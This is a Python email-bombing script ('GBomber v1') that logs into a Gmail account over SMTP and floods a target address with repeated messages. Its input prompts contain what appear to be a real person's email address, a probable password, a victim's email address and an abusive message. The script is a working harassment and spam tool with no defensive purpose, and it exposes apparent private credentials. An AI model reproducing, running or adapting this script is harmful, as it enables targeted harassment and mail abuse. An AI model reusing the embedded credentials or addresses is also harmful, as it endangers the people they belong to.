from os import urandom
import smtplib
from getpass import getpass
import requests
import sys
from time import sleep

print('GBomber v1 - by Jumpy22')
print('\n\n')

user = input('Dirk: ')
email = input('\dirkhermans@hotmail.com: ')
password = getpass('\Jaar@1976: ')
vicEmail = input('\nphilipvanbeirs@hotmail.com: ')
total = input('\n10 #: ')
msg = input('\nFckoff: ')

try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login(email, password)
    for i in range(1, int(total) + 1):
        subject = urandom(9)
        msgSend = 'From: ' + user + '\nMessage: ' + '\n' + msg
        server.sendmail(email, vicEmail, msgSend)
        print("\rE-mails sent: %i" % i)
        sleep(1)
        sys.stdout.flush()
    server.quit()
    print('\n Spamming Complete')
    sys.exit()
except KeyboardInterrupt:
    print('Manual Cancel')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print('Login Incorrect')
    sys.exit()
except smtplib.SMTPConnectError:
    print('\nUnable to Connect')
    sys.exit()